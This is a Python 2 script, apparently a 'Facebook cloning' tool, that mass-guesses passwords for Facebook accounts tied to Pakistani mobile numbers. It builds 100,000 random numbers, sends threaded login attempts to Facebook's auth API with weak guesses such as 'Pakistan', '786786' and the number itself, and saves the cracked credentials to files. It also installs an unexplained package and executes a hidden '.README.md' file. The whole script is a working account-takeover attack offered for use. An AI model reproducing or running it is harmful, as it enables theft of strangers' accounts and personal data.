#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To shadow hacker
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2020
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(100000):
 
    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')
 
    print(nmbr)
 
    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 nmbr.py')
    
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
 
 
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('user-agent','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]')]
def exb():
	print '[!] Exit'
	os.sys.exit()
 
def psb(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
 
def t():
    time.sleep(1)
def cb():
    os.system('clear')
logo='''
                ▓█████▄  ██▓ ███▄    █  ▒█████  
▒██▀ ██▌▓██▒ ██ ▀█   █ ▒██▒  ██▒
░██   █▌▒██▒▓██  ▀█ ██▒▒██░  ██▒
░▓█▄   ▌░██░▓██▒  ▐▌██▒▒██   ██░
░▒████▓ ░██░▒██░   ▓██░░ ████▓▒░
 ▒▒▓  ▒ ░▓  ░ ▒░   ▒ ▒ ░ ▒░▒░▒░ 
 ░ ▒  ▒  ▒ ░░ ░░   ░ ▒░  ░ ▒ ▒░ 
 ░ ░  ░  ▒ ░   ░   ░ ░ ░ ░ ░ ▒  
   ░     ░           ░     ░ ░  
 ░                              
                                    
               
               
               
              
               
\x1b[1;93m--------------------------------------------------------------
\x1b[1;93m   Authr  : Shah Dino Baloch
\x1b[1;93m   Facebook : fb.com/shahdinobaloch15
\x1b[1;93m   Warning : Enjoy free cloning
\x1b[1;93m--------------------------------------------------------------"""
                                '''

back = 0
successful = []
cpb = []
oks = []
id = []
def menu():
	os.system('clear')
	print logo
	print "\033[1;93mWithout login fast crack"
	print
        print "\033[1;93mAttack on pakistani network"
	print "\033[1;93m[1]  Moblink"
	print "\033[1;93m[2]  Telenor"
	print "\033[1;93m[3]  Warid"
	print "\033[1;93m[4]  Ufone"
	print "\033[1;93m[5]  Zong "
	print "\033[1;93m[6]  Update syestem"
	print "\033[1;93m[0]  Exit"	    
	print 50*'-'
	action()
	
def action():	
	bch = raw_input('\n  Enter here any number ')
	if bch =='':
		print '[!] Fill in correctly'
		action()
	elif bch =="1":
		os.system("clear")
		print (logo)
		print "\033[1;93mMoblink/Jazz"		
		print "\033[1;93m00, 01, 02, 03, 04,"
		print "\033[1;93m05, 06, 07, 08, 09,"
		try:
			c = raw_input(" Select Code: ")
			k="03"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="2":			
		os.system("clear")
		print (logo)
		print "\033[1;93mTelenor code"		
		print "\033[1;93m40, 41, 42, 43, 44,"
		print "\033[1;93m45, 64, ??, ??, ??,"
		try:
			c = raw_input(" Select code: ")
			k="03"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="3":			
		os.system("clear")
		print (logo)
		print "\033[1;93mWarid code"		
		print "\033[1;93m20, 21, 22, 23,"
		print "\033[1;93m24, ??, ??, ??,"
		try:
			c = raw_input(" Select code: ")
			k="03"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()	
	elif bch =="4":			
		os.system("clear")
		print (logo)
		print "\033[1;93mUfone code"		
		print "\033[1;93m31, 32, 33, 34,"
		print "\033[1;93m35, 36, 37, ??,"
		try:
			c = raw_input(" Select code: ")
			k="03"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()	
	elif bch =="5":			
		os.system("clear")
		print (logo)
		print "\033[1;93mZong code"		
		print "\033[1;93m10, 11, 12, 13,"
		print "\033[1;93m14, 15, 16, 17,"
		try:
			c = raw_input(" Select code: ")
			k="03"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="6":
	    os.system("clear")
	    os.system("pip2 install --upgrade balln")
	    os.system("pip2 install --upgrade balln")
	    os.system("clear")
	    print(logo)
	    print
	    psb (" Tool has been successfully updated")
	    time.sleep(2)
	    os.system("python2 .README.md")
#	elif chb =='3':	
#	    os.system('xdg-open https://www.facebook.com/Shah Dino')
#	    time.sleep(1)
#	    menu()
	elif bch =='0':
		exb()
	else:
		print '[!] Fill in correctly'
		action()
 
	xxx = str(len(id))
	psb ('[✓] Total Numbers: '+xxx)
	time.sleep(0.5)
	psb ('[✓] Please wait, process is running ...')
	time.sleep(0.5)
	psb ('[✓] Your VPN has been Connected with ...')
	time.sleep(0.5)
	psb ('[!] To stopp the process CLTR +Z press karen')
	time.sleep(0.5)
	print 50*'-'
	print
	
			
	def main(arg):
		global cpb,oks
		user = arg
		try:
			os.mkdir('save')
		except OSError:
			pass
		try:
			pass1 = user
			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92m[Dino-OK]\x1b[1;92m-\x1b[1;92m \x1b[1;92m-' + k + c + user + '-\x1b[1;92m \x1b[1;92m-' + pass1																				
				okb = open('save/successfull.txt', 'a')
				okb.write(k+c+user+'|'+pass1+'\n')
				okb.close()
				oks.append(c+user+pass1)
			else:
				if 'www.facebook.com' in q['error_msg']:
					print '\x1b[1;93m[Dino-CP]\x1b[1;93m-\x1b[1;93m \x1b[1;93m-' + k + c + user + '-\x1b[1;93m \x1b[1;93m-' + pass1
					cps = open('save/checkpoint.txt', 'a')
					cps.write(k+c+user+'|'+pass1+'\n')
					cps.close()
					cpb.append(c+user+pass1)
				else:	
					pass2 = 'Pakistan'
					data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			                q = json.load(data)
					if 'access_token' in q:
		                        	print '\x1b[1;92m[Dino-OK]\x1b[1;92m-\x1b[1;92m \x1b[1;92m-' + k + c + user + '-\x1b[1;92m \x1b[1;92m-' + pass2                            											
						okb = open('save/successfull.txt', 'a')
						okb.write(k+c+user+'|'+pass2+'\n')
						okb.close()
						oks.append(c+user+pass2)
					else:	
						if 'www.facebook.com' in q['error_msg']:
							print '\x1b[1;93m[Dino-CP]\x1b[1;93m-\x1b[1;93m \x1b[1;93m-' + k + c + user + '-\x1b[1;93m \x1b[1;93m-' + pass2
							cps = open('save/checkpoint.txt', 'a')
							cps.write(k+c+user+'|'+pass2+'\n')
							cps.close()
							cpb.append(c+user+pass2)
						else:	
							pass3 = '786786'
							data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			                                q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;92m[Dino-OK]\x1b[1;92m-\x1b[1;92m \x1b[1;92m-' + k + c + user + '-\x1b[1;92m \x1b[1;92m-' + pass3
								okb = open('save/successfull.txt', 'a')
								okb.write(k+c+user+'|'+pass3+'\n')
								okb.close()
								oks.append(c+user+pass3)
							else:	
								if 'www.facebook.com' in q['error_msg']:
									print '\x1b[1;93m[Dino-CP]\x1b[1;93m-\x1b[1;93m \x1b[1;93m-' + k + c + user + '-\x1b[1;93m \x1b[1;93m-' + pass3
									cps = open('save/checkpoint.txt', 'a')
									cps.write(k+c+user+'|'+pass3+'\n')
									cps.close()
									cpb.append(c+user+pass3)
								else:
									pass4 = k + c + user
									data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			                                                q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;92m[Dino-OK]\x1b[1;92m-\x1b[1;93m \x1b[1;92m-' + k + c + user + '-\x1b[1;92m \x1b[1;92m-' + pass4
										okb = open('save/successfull.txt', 'a')
										okb.write(k+c+user+'|'+pass4+'\n')
										okb.close()
										oks.append(c+user+pass4)
									else:
										if 'www.facebook.com' in q['error_msg']:
											print '\x1b[1;93m[Dino-CP]\x1b[1;93m-\x1b[1;93m \x1b[1;93m-' + k + c + user + '-\x1b[1;93m \x1b[1;93m-' + pass4
											cps = open('save/checkpoint.txt', 'a')
											cps.write(k+c+user+'|'+pass4+'\n')
											cps.close()
											cpb.append(c+user+pass4)
								
							
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print 50*'-'
	print '[✓] Process Has Been Completed ....'
	print '[✓] Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
	print('[✓] CP File Has Been Saved : save/checkpoint.txt')
	raw_input('\n[Press Enter To Go Back]')
	os.system('python2 .README.md')
		
if __name__ == '__main__':
	menu()
